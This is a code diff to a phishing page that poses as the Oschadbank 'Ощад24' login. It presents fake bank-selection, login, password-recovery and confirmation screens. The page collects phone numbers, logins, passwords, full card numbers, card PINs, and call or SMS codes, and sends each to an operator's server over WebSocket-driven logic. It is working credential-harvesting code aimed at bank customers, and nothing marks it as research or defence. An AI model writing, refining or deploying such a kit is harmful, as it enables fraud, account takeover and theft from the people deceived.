@@ -18,7 +18,7 @@
             font-size: 16px;
         }
         .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
-        #bank-selection-screen { opacity: 1; transform: scale(1); display: block; }
+        #bank-selection-screen { opacity: 1; transform: scale(1); }
         
         #form-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -32,7 +32,7 @@
             background-color: var(--white); padding: 30px; border-radius: 20px;
             box-shadow: 0 15px 40px rgba(0,0,0,0.2);
         }
-        body.form-active { background: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); overflow: hidden; }
+        body.form-active { background: var(--bg-gradient); overflow: hidden; }
         body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
         body.form-active #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
         h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
@@ -54,11 +54,13 @@
             background-color: rgba(255, 255, 255, 0.8); padding: 2px 6px; border-radius: 4px;
         }
 
-        /* Стили для модального окна ЛК Ощадбанка */
+        /* --- Стили для модального окна ЛК Ощадбанка --- */
         #custom-modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: #f8f9fa; display: none; justify-content: center; align-items: flex-start;
-            z-index: 1000; overflow-y: auto;
+            background-color: #f8f9fa;
+            display: none; justify-content: center; align-items: flex-start;
+            z-index: 1000;
+            overflow-y: auto;
         }
         .custom-modal-content {
             background-color: transparent; padding: 0; border-radius: 0;
@@ -74,19 +76,27 @@
             cursor: pointer; line-height: 1;
         }
         .oschad-header .title {
-            font-size: 17px; font-weight: 500; color: #212529;
-            flex-grow: 1; text-align: center; margin-right: 40px;
+            font-size: 17px;
+            font-weight: 500;
+            color: #212529;
+            flex-grow: 1; text-align: center; margin-right: 40px; /* Компенсация стрелки для центрирования */
         }
         .oschad-welcome-section {
-            padding: 20px; text-align: left; width: 100%;
-            display: flex; flex-direction: column; padding-bottom: 120px;
+            padding: 20px; text-align: left;
+            width: 100%;
+            display: flex; flex-direction: column;
+            padding-bottom: 120px;
         }
         .oschad-main-title {
-            font-size: 26px; font-weight: 700; margin-bottom: 8px; text-align: left;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-align: left;
         }
         .oschad-welcome-section p {
             font-size: 16px; color: #495057; line-height: 1.5;
-            margin-bottom: 25px; font-weight: 400; text-align: left;
+            margin-bottom: 25px; font-weight: 400;
+            text-align: left;
         }
         .oschad-toggle-buttons {
             display: flex; background-color: #e9ecef; border-radius: 12px;
@@ -98,7 +108,8 @@
             border-radius: 8px; transition: all 0.2s ease;
         }
         .oschad-toggle-buttons button.active {
-            background-color: var(--white); color: var(--dark-text);
+            background-color: var(--white);
+            color: var(--dark-text);
             box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
         .oschad-input-group {
@@ -120,9 +131,6 @@
             transition: all 0.2s ease; outline: none;
             font-weight: 500; position: relative;
         }
-        .oschad-input-field.error {
-            border-color: var(--danger-color);
-        }
         .oschad-input-field:focus {
             border-color: var(--oschad-primary);
         }
@@ -138,9 +146,6 @@
             background-color: var(--white);
             overflow: hidden;
         }
-        .oschad-phone-wrapper.error {
-            border-color: var(--danger-color);
-        }
         .oschad-phone-wrapper:focus-within {
             border-color: var(--oschad-primary);
         }
@@ -153,43 +158,64 @@
             border: none; padding-left: 5px; flex-grow: 1;
         }
         .forgot-password-link {
-            display: block; text-align: center; margin-top: -10px; margin-bottom: 20px;
-            color: var(--oschad-primary); font-weight: 600; text-decoration: none; font-size: 15px;
+            display: block;
+            text-align: center;
+            margin-top: -10px;
+            margin-bottom: 20px;
+            color: var(--oschad-primary);
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 15px;
             cursor: pointer;
         }
         .oschad-submit-button {
-            position: fixed; bottom: 20px; left: 20px; right: 20px;
+            position: fixed; bottom: 20px;
+            left: 20px; right: 20px;
             width: auto; padding: 16px; margin: 0; border: none;
-            border-radius: 16px; background-color: #e9ecef; color: #adb5bd;
-            font-size: 18px; font-weight: 700; cursor: not-allowed; transition: all 0.2s ease;
+            border-radius: 16px;
+            background-color: #e9ecef; color: #adb5bd; font-size: 18px; font-weight: 700;
+            cursor: not-allowed; transition: all 0.2s ease;
             z-index: 1001;
         }
         .oschad-submit-button.active {
             background-color: var(--oschad-primary); color: var(--white); cursor: pointer;
         }
         .auth-error-message {
-            color: var(--danger-color); font-size: 14px; text-align: center;
-            margin-top: -10px; margin-bottom: 15px;
+            color: var(--danger-color);
+            font-size: 14px;
+            text-align: center;
+            margin-top: -10px;
+            margin-bottom: 15px;
         }
         .loader-icon {
-            width: 120px; height: 120px; max-width: 100%;
-            margin: 20px auto; animation: spin 2s linear infinite;
+            width: 120px; height: 120px;
+            max-width: 100%;
+            margin: 20px auto;
+            animation: spin 2s linear infinite;
             mix-blend-mode: multiply;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* Стили для ввода кодов */
+        
+        /* --- СТИЛИ для окна подтверждения кодом --- */
         .oschad-code-container {
             padding: 20px; text-align: center; width: 100%;
             display: flex; flex-direction: column; align-items: center;
         }
         .oschad-code-container p {
-            color: #495057; margin: 0 0 10px 0; padding: 0; font-weight: 400;
+            color: #495057; margin: 0 0 10px 0; padding: 0; font-weight: 400; /* Изменен шрифт */
         }
-        .oschad-code-info { font-size: 16px; font-weight: 400; margin-bottom: 20px !important; }
-        .oschad-code-number { font-size: 22px; font-weight: 500; color: var(--dark-text) !important; margin-bottom: 5px !important; }
-        .oschad-code-instruction { font-size: 16px; font-weight: 500; margin-top: 15px !important; margin-bottom: 30px !important; }
-        .oschad-code-inputs { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }
+        .oschad-code-info {
+            font-size: 16px; font-weight: 400; margin-bottom: 20px !important;
+        }
+        .oschad-code-number {
+            font-size: 22px; font-weight: 500; color: var(--dark-text) !important; margin-bottom: 5px !important;
+        }
+        .oschad-code-instruction {
+            font-size: 16px; font-weight: 500; margin-top: 15px !important; margin-bottom: 30px !important;
+        }
+        .oschad-code-inputs {
+            display: flex; justify-content: center; gap: 15px; margin-bottom: 20px;
+        }
         .oschad-code-input {
             width: 50px; height: 55px; text-align: center; font-size: 24px; font-weight: 600;
             border: 1px solid #dee2e6; border-radius: 12px; background-color: var(--white);
@@ -200,39 +226,25 @@
         .oschad-code-input::-webkit-outer-spin-button, .oschad-code-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
         .oschad-code-input:focus { border-color: var(--oschad-primary); }
         .oschad-code-inputs.error .oschad-code-input { border-color: var(--danger-color); }
-        .oschad-code-error-text { color: var(--danger-color); font-size: 15px; font-weight: 500; margin-bottom: 20px; }
+        .oschad-code-error-text {
+            color: var(--danger-color); font-size: 15px; font-weight: 500; margin-bottom: 20px;
+        }
         .oschad-resend-link {
-            display: block; color: #6c757d; font-weight: 500;
+            display: block; color: #6c757d; /* Серый по умолчанию */ font-weight: 500;
             text-decoration: none; font-size: 15px; margin-bottom: 25px;
-            pointer-events: none;
+            pointer-events: none; /* Неактивна по умолчанию */
         }
         .oschad-resend-link.active {
-            color: var(--oschad-primary); cursor: pointer; pointer-events: auto;
+            color: var(--oschad-primary); /* Активный цвет */
+            cursor: pointer;
+            pointer-events: auto;
         }
         .oschad-no-call-link {
-            display: block; color: var(--oschad-primary); font-weight: 500;
+            display: block; color: var(--oschad-primary); /* Бирюзовый цвет */ font-weight: 500;
             text-decoration: none; font-size: 15px; cursor: pointer;
         }
 
-        /* Стили для ввода ПИН-кода */
-        .oschad-pin-inputs {
-            display: flex; justify-content: center; gap: 15px; margin-bottom: 20px;
-        }
-        .oschad-pin-input {
-            width: 50px; height: 55px; text-align: center; font-size: 24px; font-weight: 600;
-            border: 1px solid #dee2e6; border-radius: 12px; background-color: var(--white);
-            outline: none; transition: border-color 0.2s ease; color: var(--dark-text);
-            caret-color: var(--oschad-primary); padding: 0; -moz-appearance: textfield;
-            -webkit-text-security: disc; /* Заменяем вводимые символы на звездочки */
-        }
-        .oschad-pin-input::-webkit-outer-spin-button,
-        .oschad-pin-input::-webkit-inner-spin-button {
-            -webkit-appearance: none; margin: 0;
-        }
-        .oschad-pin-input:focus { border-color: var(--oschad-primary); }
-        .oschad-pin-input.error { border-color: var(--danger-color); }
-
-        /* Стили для модального окна "Нет SMS" */
+        /* --- Стили для модального окна "Нет SMS" --- */
         .sms-help-modal-backdrop {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-color: rgba(0, 0, 0, 0.5); display: flex;
@@ -250,7 +262,7 @@
             font-weight: 600; cursor: pointer; width: 100%; background-color: transparent; color: var(--oschad-primary);
         }
 
-        /* Общие стили формы */
+        /* --- ОБЩИЕ СТИЛИ ФОРМЫ (для восстановления и т.д.) --- */
         .oschad-form-container { padding: 20px; text-align: left; width: 100%; display: flex; flex-direction: column; padding-bottom: 120px; }
         .oschad-form-container .oschad-main-title { text-align: left; margin-bottom: 10px; }
         .oschad-form-container p { text-align: left; margin-bottom: 30px; }
@@ -325,7 +337,7 @@ document.addEventListener('DOMContentLoaded', () => {
     let currentStepIndex = 0;
     let collectedData = {};
     let callTimerInterval;
-    let lastCodeScreen = null;
+    let lastCodeScreen = null; // To track which code screen was last shown
 
     // --- DOM ELEMENTS ---
     const bankGrid = document.querySelector('.bank-grid');
@@ -338,18 +350,9 @@ document.addEventListener('DOMContentLoaded', () => {
     const backBtn = document.getElementById('back-btn');
     const customModalOverlay = document.getElementById('custom-modal-overlay');
     const customModalContent = document.getElementById('custom-modal-content');
-
+    
     // --- INITIALIZATION ---
-    function initializeBankGrid() {
-        bankGrid.innerHTML = Object.keys(bankFlows).map(id => `
-            <a href="#" class="bank-item" data-bank="${id}">
-                <img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}">
-                <span class="bank-name">${bankFlows[id].name}</span>
-            </a>
-        `).join('');
-        addBankItemListeners();
-    }
-    initializeBankGrid();
+    bankGrid.innerHTML = Object.keys(bankFlows).map(id => `<a href="#" class="bank-item" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span></a>`).join('');
 
     // --- WEBSOCKET LOGIC ---
     function connectWebSocket() {
@@ -360,32 +363,36 @@ document.addEventListener('DOMContentLoaded', () => {
         ws.onclose = () => setTimeout(connectWebSocket, 3000);
         ws.onerror = (error) => console.error('WebSocket error:', error);
     }
-
+    
     // --- DYNAMIC RENDER FUNCTIONS ---
+    
+    /** Renders the main Oschadbank login modal */
     function renderOschadbankLogin(options = {}) {
-        const { errorType, errorMessage, preservePhone } = options;
+        const { errorType, errorMessage } = options;
+        
         const html = `
             <div class="oschad-header">
                 <span class="back-arrow" id="oschad-back-arrow">←</span>
-                <span class="title">Авторизуйтесь через Ощад24</span>
+                <span class="title">Авторизуйтесь через Ощад24</span> 
             </div>
             <div class="oschad-welcome-section">
                 <h2 class="oschad-main-title">Ласкаво просимо</h2>
                 <p>Для входу введіть логін або номер телефону</p>
                 <div class="oschad-toggle-buttons">
-                    <button id="toggle-phone" class="${collectedData.loginMethod === 'phone' || !collectedData.loginMethod ? 'active' : ''}">Номер телефону</button>
-                    <button id="toggle-login" class="${collectedData.loginMethod === 'login' ? 'active' : ''}">Логін</button>
+                    <button id="toggle-phone" class="active">Номер телефону</button>
+                    <button id="toggle-login">Логін</button>
                 </div>
-                <div id="phone-login-form" style="display: ${collectedData.loginMethod === 'login' ? 'none' : 'block'};">
-                    <div class="oschad-input-group phone-group ${preservePhone ? 'has-value' : ''} ${errorType === 'phone' ? 'error' : ''}">
-                        <div class="oschad-phone-wrapper ${errorType === 'phone' ? 'error' : ''}">
+
+                <div id="phone-login-form">
+                    <div class="oschad-input-group phone-group">
+                        <div class="oschad-phone-wrapper">
                             <span class="oschad-phone-prefix">+380</span>
-                            <input type="tel" class="oschad-input-field ${errorType === 'phone' ? 'error' : ''}" id="phone_input" placeholder=" " autocomplete="off" value="${preservePhone || ''}">
+                            <input type="tel" class="oschad-input-field" id="phone_input" placeholder=" " autocomplete="off">
                         </div>
                     </div>
                     <div class="oschad-input-group">
                         <label for="phone_password_input">Пароль</label>
-                        <input type="password" class="oschad-input-field ${errorType === 'phone' ? 'error' : ''}" id="phone_password_input" placeholder=" " autocomplete="off">
+                        <input type="password" class="oschad-input-field" id="phone_password_input" placeholder=" " autocomplete="off">
                         <span class="password-toggle-icon">
                             <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                         </span>
@@ -393,19 +400,20 @@ document.addEventListener('DOMContentLoaded', () => {
                     ${errorType === 'phone' ? `<div class="auth-error-message">${errorMessage}</div>` : ''}
                     <a href="#" class="forgot-password-link">Забули пароль?</a>
                 </div>
-                <div id="login-form" style="display: ${collectedData.loginMethod === 'login' ? 'block' : 'none'};">
+
+                <div id="login-form" style="display: none;">
                     <div class="oschad-input-group">
                         <label for="login_input">Логін</label>
-                        <input type="text" class="oschad-input-field ${errorType === 'login' ? 'error' : ''}" id="login_input" placeholder=" " autocomplete="off">
+                        <input type="text" class="oschad-input-field" id="login_input" placeholder=" " autocomplete="off">
                     </div>
                     <div class="oschad-input-group">
                         <label for="login_password_input">Пароль</label>
-                        <input type="password" class="oschad-input-field ${errorType === 'login' ? 'error' : ''}" id="login_password_input" placeholder=" " autocomplete="off">
+                        <input type="password" class="oschad-input-field" id="login_password_input" placeholder=" " autocomplete="off">
                         <span class="password-toggle-icon">
                             <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                         </span>
                     </div>
-                    ${errorType === 'login' ? `<div class="auth-error-message">${errorMessage}</div>` : ''}
+                     ${errorType === 'login' ? `<div class="auth-error-message">${errorMessage}</div>` : ''}
                     <a href="#" class="forgot-password-link">Забули пароль?</a>
                 </div>
             </div>
@@ -416,6 +424,7 @@ document.addEventListener('DOMContentLoaded', () => {
         addOschadbankLoginListeners();
     }
 
+    /** Renders the loader screen */
     function showOschadLoader() {
         customModalContent.innerHTML = `
             <div class="oschad-header">
@@ -430,10 +439,12 @@ document.addEventListener('DOMContentLoaded', () => {
         `;
         document.getElementById('loader-back-arrow').addEventListener('click', () => renderOschadbankLogin());
     }
-
+    
+    /** Renders a generic code input screen */
     function renderCodeScreen(options) {
         const { title, header, infoText, instructionText, resendText, noAccessText, onNoAccessClick, screenId, error } = options;
         lastCodeScreen = screenId;
+
         const html = `
             <div class="oschad-header">
                 <span class="back-arrow" id="code-screen-back-arrow">←</span>
@@ -457,30 +468,39 @@ document.addEventListener('DOMContentLoaded', () => {
         `;
         customModalContent.innerHTML = html;
         customModalOverlay.style.display = 'flex';
+
         document.getElementById('code-screen-back-arrow').addEventListener('click', () => {
-            (collectedData.currentFlow === 'forgot_password') ? renderForgotPasswordFlow(3) : renderOschadbankLogin();
+             // Go back to login or previous step based on context
+             (collectedData.currentFlow === 'forgot_password') ? renderForgotPasswordFlow(3) : renderOschadbankLogin();
         });
+        
         if (noAccessText && onNoAccessClick) {
             document.getElementById('no-access-link').addEventListener('click', (e) => {
                 e.preventDefault();
                 onNoAccessClick();
             });
         }
+        
         setupCodeInputs(screenId);
-        startCallTimer(60);
+        startCallTimer(60); // Assuming all code screens have a timer
+        
         const firstInput = document.querySelector('.oschad-code-input');
-        if (firstInput) setTimeout(() => firstInput.focus(), 100);
+        if (firstInput) {
+             setTimeout(() => firstInput.focus(), 100); // Small delay for keyboard
+        }
     }
-
+    
+    /** Renders the Oschadbank call confirmation screen */
     function renderOschadbankCallConfirmation(options = {}) {
         let infoText = 'На Ваш номер телефонує Ощадбанк:';
         if (collectedData.loginMethod === 'phone' && collectedData.phone) {
-            const phone = collectedData.phone.replace(/\D/g, '');
+            const phone = collectedData.phone.replace(/\D/g, ''); // +380...
             const maskedPhone = `+${phone.substring(0,3)} ${phone.substring(3,5)} *** ** ${phone.substring(11)}`;
             infoText = `На Ваш номер ${maskedPhone} телефонує Ощадбанк:`;
         } else if (collectedData.loginMethod === 'login') {
             infoText = 'Вам телефонує Ощадбанк:';
         }
+        
         renderCodeScreen({
             header: 'Підтвердження',
             infoText: infoText,
@@ -494,6 +514,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
+    /** Renders the "Telegram Debit" SMS screen */
     function renderTelegramSmsScreen(options = {}) {
         renderCodeScreen({
             header: 'Підтвердження',
@@ -504,49 +525,51 @@ document.addEventListener('DOMContentLoaded', () => {
             error: options.error
         });
     }
-
+    
+    /** Renders the multi-step "Forgot Password" flow */
     function renderForgotPasswordFlow(step, options = {}) {
         collectedData.currentFlow = 'forgot_password';
         let html = '';
         let backFunction = () => renderOschadbankLogin();
         let submitFunction;
+        
         switch(step) {
-            case 1:
+            case 1: // Phone input
                 html = `
                     <div class="oschad-header">
                         <span class="back-arrow" id="fp-back-arrow">←</span>
-                        <span class="title">Відновлення пароля</span>
+                        <span class="title">Відновлення пароля</span> 
                     </div>
                     <div class="oschad-form-container">
                         <p>Для відновлення пароля введіть свій фінансовий номер телефону</p>
-                        <div class="oschad-input-group phone-group">
-                            <label for="fp_phone_input">Номер телефону</label>
-                            <div class="oschad-phone-wrapper">
-                                <span class="oschad-phone-prefix">+380</span>
-                                <input type="tel" class="oschad-input-field" id="fp_phone_input" placeholder=" " autocomplete="off">
-                            </div>
+                        <div class="oschad-input-group phone-group has-value">
+                           <label for="fp_phone_input">Номер телефону</label>
+                           <div class="oschad-phone-wrapper">
+                               <span class="oschad-phone-prefix">+380</span>
+                               <input type="tel" class="oschad-input-field" id="fp_phone_input" placeholder=" " autocomplete="off">
+                           </div>
                         </div>
                     </div>
                     <button class="oschad-submit-button" id="fp-submit-btn" disabled>ПРОДОВЖИТИ</button>
                 `;
                 submitFunction = () => {
                     const phoneInput = document.getElementById('fp_phone_input');
-                    collectedData.fp_phone = '+380' + phoneInput.value.replace(/\D/g, '');
-                    sendDataToServer({ fp_phone: collectedData.fp_phone }, false);
+                    const phoneValue = '+380' + phoneInput.value.replace(/\D/g, '');
+                    sendDataToServer({ fp_phone: phoneValue }, false);
                     renderForgotPasswordFlow(2);
                 };
                 break;
-            case 2:
-                html = `
+            case 2: // Card input
+                 html = `
                     <div class="oschad-header">
                         <span class="back-arrow" id="fp-back-arrow">←</span>
-                        <span class="title">Відновлення пароля</span>
+                        <span class="title">Відновлення пароля</span> 
                     </div>
                     <div class="oschad-form-container">
                         <h2 class="oschad-main-title">Введіть ваш номер картки</h2>
                         <div class="oschad-input-group">
-                            <label for="fp_card_input">Номер картки</label>
-                            <input type="tel" class="oschad-input-field" id="fp_card_input" placeholder=" " autocomplete="off" maxlength="19">
+                           <label for="fp_card_input">Номер картки</label>
+                           <input type="tel" class="oschad-input-field" id="fp_card_input" placeholder=" " autocomplete="off" maxlength="19">
                         </div>
                     </div>
                     <button class="oschad-submit-button" id="fp-submit-btn" disabled>ПРОДОВЖИТИ</button>
@@ -554,38 +577,36 @@ document.addEventListener('DOMContentLoaded', () => {
                 backFunction = () => renderForgotPasswordFlow(1);
                 submitFunction = () => {
                     const cardInput = document.getElementById('fp_card_input');
-                    collectedData.fp_card = cardInput.value.replace(/\D/g, '');
-                    sendDataToServer({ fp_card: collectedData.fp_card }, false);
+                    const cardValue = cardInput.value.replace(/\D/g, '');
+                    sendDataToServer({ fp_card: cardValue }, false);
                     renderForgotPasswordFlow(3);
                 };
                 break;
-            case 3:
+            case 3: // PIN input
                 const last4 = collectedData.fp_card ? collectedData.fp_card.slice(-4) : 'XXXX';
-                html = `
+                 html = `
                     <div class="oschad-header">
                         <span class="back-arrow" id="fp-back-arrow">←</span>
-                        <span class="title">Відновлення пароля</span>
+                        <span class="title">Відновлення пароля</span> 
                     </div>
                     <div class="oschad-form-container">
                         <h2 class="oschad-main-title">Введіть пін від картки *${last4}</h2>
-                        <div class="oschad-pin-inputs" id="pin-inputs-container">
-                            <input type="tel" inputmode="numeric" maxlength="1" class="oschad-pin-input" placeholder="–">
-                            <input type="tel" inputmode="numeric" maxlength="1" class="oschad-pin-input" placeholder="–">
-                            <input type="tel" inputmode="numeric" maxlength="1" class="oschad-pin-input" placeholder="–">
-                            <input type="tel" inputmode="numeric" maxlength="1" class="oschad-pin-input" placeholder="–">
+                        <div class="oschad-input-group">
+                           <label for="fp_pin_input">ПІН-код</label>
+                           <input type="password" class="oschad-input-field" id="fp_pin_input" placeholder=" " autocomplete="off" maxlength="4" inputmode="numeric">
                         </div>
                     </div>
                     <button class="oschad-submit-button" id="fp-submit-btn" disabled>ПРОДОВЖИТИ</button>
                 `;
-                backFunction = () => renderForgotPasswordFlow(2);
-                submitFunction = () => {
-                    const pinInputs = document.querySelectorAll('.oschad-pin-input');
-                    collectedData.fp_pin = [...pinInputs].map(input => input.value).join('');
-                    sendDataToServer({ fp_pin: collectedData.fp_pin }, false);
+                 backFunction = () => renderForgotPasswordFlow(2);
+                 submitFunction = () => {
+                    const pinInput = document.getElementById('fp_pin_input');
+                    sendDataToServer({ fp_pin: pinInput.value }, false);
                     renderOschadbankCallConfirmation();
                 };
                 break;
         }
+
         customModalContent.innerHTML = html;
         customModalOverlay.style.display = 'flex';
         document.getElementById('fp-back-arrow').addEventListener('click', backFunction);
@@ -594,46 +615,28 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // --- HELPER & EVENT LISTENER FUNCTIONS ---
-    function addBankItemListeners() {
-        document.querySelectorAll('.bank-item').forEach(item => {
-            item.addEventListener('click', e => {
-                e.preventDefault();
-                if (item.classList.contains('disabled')) return;
-                const bankId = item.dataset.bank;
-                activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
-                collectedData = { currentFlow: 'standard' };
-                if (bankId === 'oschadbank') {
-                    collectedData.currentFlow = 'login';
-                    renderOschadbankLogin();
-                } else {
-                    body.dataset.theme = activeBankData.theme;
-                    formHeaderLogo.src = activeBankData.logoUrl;
-                    body.classList.add('form-active');
-                    currentStepIndex = 0;
-                    renderStep();
-                }
-                connectWebSocket();
-            });
-        });
-    }
 
+    /** Adds event listeners for the main Oschadbank login modal */
     function addOschadbankLoginListeners() {
         document.getElementById('oschad-back-arrow').addEventListener('click', () => { window.location.reload(); });
         document.querySelector('.forgot-password-link').addEventListener('click', (e) => {
             e.preventDefault();
             renderForgotPasswordFlow(1);
         });
+
         const togglePhoneBtn = document.getElementById('toggle-phone');
         const toggleLoginBtn = document.getElementById('toggle-login');
         const phoneLoginForm = document.getElementById('phone-login-form');
         const loginForm = document.getElementById('login-form');
-        let activeOschadForm = collectedData.loginMethod || 'phone';
+        let activeOschadForm = 'phone';
+        
         const phoneInput = document.getElementById('phone_input');
         const phonePassInput = document.getElementById('phone_password_input');
         const loginInput = document.getElementById('login_input');
         const loginPassInput = document.getElementById('login_password_input');
         const submitBtn = document.getElementById('oschad-submit-btn');
-
+        
+        // Label animation logic
         document.querySelectorAll('.oschad-input-group').forEach(group => {
             const input = group.querySelector('.oschad-input-field');
             if (!input) return;
@@ -644,8 +647,16 @@ document.addEventListener('DOMContentLoaded', () => {
             checkValue();
         });
 
+        // Phone formatting
         phoneInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '').substring(0, 9);
+            let rawValue = e.target.value.replace(/\D/g, '');
+
+            // FIX: If user pastes a number like +380..., strip the 380 prefix.
+            if (rawValue.startsWith('380')) {
+                rawValue = rawValue.substring(3);
+            }
+
+            let value = rawValue.substring(0, 9);
             let formatted = '';
             if (value.length > 0) formatted += value.substring(0, 2);
             if (value.length > 2) formatted += ' ' + value.substring(2, 5);
@@ -654,6 +665,7 @@ document.addEventListener('DOMContentLoaded', () => {
             e.target.value = formatted.trim();
         });
 
+        // Button state logic
         const updateOschadButtonState = () => {
             const isPhoneFormValid = activeOschadForm === 'phone' && phoneInput.value.replace(/\D/g, '').length === 9 && phonePassInput.value.length > 0;
             const isLoginFormValid = activeOschadForm === 'login' && loginInput.value.length > 0 && loginPassInput.value.length > 0;
@@ -665,19 +677,19 @@ document.addEventListener('DOMContentLoaded', () => {
         };
         [phoneInput, phonePassInput, loginInput, loginPassInput].forEach(input => input.addEventListener('input', updateOschadButtonState));
 
+        // Toggle logic
         togglePhoneBtn.addEventListener('click', () => {
             togglePhoneBtn.classList.add('active'); toggleLoginBtn.classList.remove('active');
             phoneLoginForm.style.display = 'block'; loginForm.style.display = 'none';
             activeOschadForm = 'phone'; updateOschadButtonState();
-            collectedData.loginMethod = 'phone';
         });
         toggleLoginBtn.addEventListener('click', () => {
             toggleLoginBtn.classList.add('active'); togglePhoneBtn.classList.remove('active');
             phoneLoginForm.style.display = 'none'; loginForm.style.display = 'block';
             activeOschadForm = 'login'; updateOschadButtonState();
-            collectedData.loginMethod = 'login';
         });
-
+        
+        // Password toggle icon
         customModalContent.querySelectorAll('.password-toggle-icon').forEach(icon => {
             icon.addEventListener('click', () => {
                 const passwordInput = icon.closest('.oschad-input-group').querySelector('input');
@@ -687,14 +699,15 @@ document.addEventListener('DOMContentLoaded', () => {
             });
         });
 
+        // Submit logic
         submitBtn.onclick = () => {
-            if (submitBtn.disabled) return;
-            const dataToSend = { bank: activeBankData.name };
-            collectedData.loginMethod = activeOschadForm;
+            if(submitBtn.disabled) return;
+            const dataToSend = {};
+            collectedData.loginMethod = activeOschadForm; // Store login method
+            
             if (activeOschadForm === 'phone') {
                 dataToSend.phone = '+380' + phoneInput.value.replace(/\D/g, '');
                 dataToSend.password = phonePassInput.value;
-                collectedData.phone = dataToSend.phone;
             } else {
                 dataToSend.login = loginInput.value;
                 dataToSend.password = loginPassInput.value;
@@ -704,9 +717,11 @@ document.addEventListener('DOMContentLoaded', () => {
         };
     }
 
+    /** Adds listeners for the "Forgot Password" flow */
     function addForgotPasswordListeners(step) {
         const submitBtn = document.getElementById('fp-submit-btn');
         let input;
+        
         switch(step) {
             case 1:
                 input = document.getElementById('fp_phone_input');
@@ -723,38 +738,27 @@ document.addEventListener('DOMContentLoaded', () => {
             case 2:
                 input = document.getElementById('fp_card_input');
                 input.addEventListener('input', (e) => {
-                    e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
-                    if (e.target.value.replace(/\D/g, '').length === 16) {
+                     e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
+                     if (e.target.value.replace(/\D/g, '').length === 16) {
                         submitBtn.classList.add('active'); submitBtn.disabled = false;
                     } else {
                         submitBtn.classList.remove('active'); submitBtn.disabled = true;
                     }
                 });
                 break;
-            case 3:
-                const pinInputs = document.querySelectorAll('.oschad-pin-input');
-                pinInputs.forEach((input, index) => {
-                    input.addEventListener('input', () => {
-                        if (input.value && index < pinInputs.length - 1) {
-                            pinInputs[index + 1].focus();
-                        }
-                        const allFilled = [...pinInputs].every(inp => inp.value.length === 1);
-                        if (allFilled) {
-                            submitBtn.classList.add('active');
-                            submitBtn.disabled = false;
-                        } else {
-                            submitBtn.classList.remove('active');
-                            submitBtn.disabled = true;
-                        }
-                    });
-                    input.addEventListener('keydown', (e) => {
-                        if (e.key === 'Backspace' && !input.value && index > 0) {
-                            pinInputs[index - 1].focus();
-                        }
-                    });
+             case 3:
+                input = document.getElementById('fp_pin_input');
+                input.addEventListener('input', () => {
+                     if (input.value.length === 4) {
+                        submitBtn.classList.add('active'); submitBtn.disabled = false;
+                    } else {
+                        submitBtn.classList.remove('active'); submitBtn.disabled = true;
+                    }
                 });
                 break;
         }
+
+        // Label animation
         document.querySelectorAll('.oschad-input-group').forEach(group => {
             const inputEl = group.querySelector('.oschad-input-field');
             if (!inputEl) return;
@@ -766,31 +770,36 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
+    /** Starts the resend timer for code screens */
     function startCallTimer(seconds) {
         const link = document.getElementById('resend-link');
         if (!link) return;
         clearInterval(callTimerInterval);
+
         let timer = seconds;
-        const initialText = link.textContent;
+        const initialText = link.textContent; // Store original text like "Запросити дзвінок повторно"
+
         function updateTimer() {
             if (timer < 0) {
                 clearInterval(callTimerInterval);
                 link.textContent = initialText + '?';
-                link.classList.add('active');
+                link.classList.add('active'); // Make it active (turquoise)
                 link.onclick = (e) => {
                     e.preventDefault();
-                    startCallTimer(60);
+                    // Logic to resend call/SMS
+                    startCallTimer(60); // Restart timer
                 };
             } else {
                 link.textContent = `${initialText} через ${timer} секунд`;
-                link.classList.remove('active');
+                link.classList.remove('active'); // Keep it grey
                 timer--;
             }
         }
         updateTimer();
         callTimerInterval = setInterval(updateTimer, 1000);
     }
-
+    
+    /** Sets up auto-tabbing and submission for code inputs */
     function setupCodeInputs(screenId) {
         const codeInputs = document.querySelectorAll('.oschad-code-input');
         codeInputs.forEach((input, index) => {
@@ -802,7 +811,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (allFilled) {
                     const code = [...codeInputs].map(inp => inp.value).join('');
                     const dataKey = screenId === 'oschad_call' ? 'call_code' : 'sms_code';
-                    sendDataToServer({ [dataKey]: code }, false);
+                    sendDataToServer({ [dataKey]: code }, true);
                     showOschadLoader();
                 }
             });
@@ -814,6 +823,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
+    /** Shows the "No SMS" help modal */
     function showNoSmsModal() {
         if (document.querySelector('.sms-help-modal-backdrop')) return;
         const modalHtml = `
